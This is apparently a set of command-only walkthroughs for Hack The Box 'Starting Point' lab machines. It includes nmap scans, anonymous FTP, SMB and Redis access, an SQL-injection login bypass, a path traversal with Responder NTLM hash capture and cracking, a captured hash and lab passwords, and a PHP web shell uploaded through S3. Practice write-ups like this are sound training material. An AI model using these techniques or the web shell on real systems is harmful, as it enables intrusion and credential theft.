# starting point machines

## Meow

```shell
sudo namp -sN -A <ip_address> -v
telnet <ip_address>
username: root
cat flag.txt
```

## Fawn

```shell
sudo nmap -sN -A <ip_address> -v
ftp <ip_address>
username: anonymous
get flag.txt
exit
cat flag.txt
```

## Dancing

```shell
sudo nmap -sN -A <ip_address> -v
sudo nmap -A <ip_address> -
smbclient -L <ip_address>
smbclient //<ip_address>/WorkShares
cd James.P
get flag.txt
```

## Redeemer

```shell
sudo nmap -A -p1-9000 <ip_address>
sudo apt-get install redis -y
redis-cli -h 10.129.107.1
info
select 0
keys *
get flag
```

## Appointment

```shell
sudo nmap -sN -A <ip_address>
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url <ip_address>
# Web Login Credentials
# username: admin'#
```

## Sequel 

```shell
sudo nmap -sN -A <ip_address>
mysql --user=root --host=<ip_address> --port=3306
show databases;
use htb;
select * From config;
```

## Crocodile

```shell
sudo nmap -sN -A <ip_address>
ftp 10.129.107.34 
# Username: anonymous
get allowed.userlist
# useername: admin
get allowed.userlist.passwd
# password: rKXM59ESxesUFHAd
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url <ip_address>
# find login.php
<ip_address>/login.php
# username: admin
# password: rKXM59ESxesUFHAd
```

## Responder

```shell
sudo nmap -sN -A <ip_address>
<ip_address>
echo "<ip_address> unika.htb" >> /etc/hosts
# http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
sudo responder -I tun0
# http://unika.htb/index.php?page=//10.10.14.201/file
echo " Administrator::RESPONDER:9edb562faa3ed546:DDB8D25C0B447C1AA3C01E830C713738:010100000000000080C00D5464CADC019BAC598CCADDBE2F0000000002000800460037005A004F0001001E00570049004E002D004500350041004A004A0057005500340045004A00510004003400570049004E002D004500350041004A004A0057005500340045004A0051002E00460037005A004F002E004C004F00430041004C0003001400460037005A004F002E004C004F00430041004C0005001400460037005A004F002E004C004F00430041004C000700080080C00D5464CADC0106000400020000000800300030000000000000000100000000200000BC712D28AD8E105EBEC3ED565C5A255D4A2A4525B4771A13985237135675DF2B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200300031000000000000000000" >> responder.txt
sudo john --wordlist=/usr/share/wordlists/rockyou.txt responder.
sudo evil-winrm -U Administrator -p badminton -i <ip_address>
cd C:\Users\mike\Desktop
type flag.txt
```

## Three

```shell
sudo nmap -sN -A <ip_address>
echo "<ip_address> thetoppers.htb" >> /etc/hosts
sudo wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u <ip_address>/
s3.thetoppers.htb
sudo apt-get install awscli -y
echo "<ip_adress> s3.thetoppers.htb" >> /etc/hosts
aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
http://thetoppers.htb/shell.php?cmd=ls
http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt
```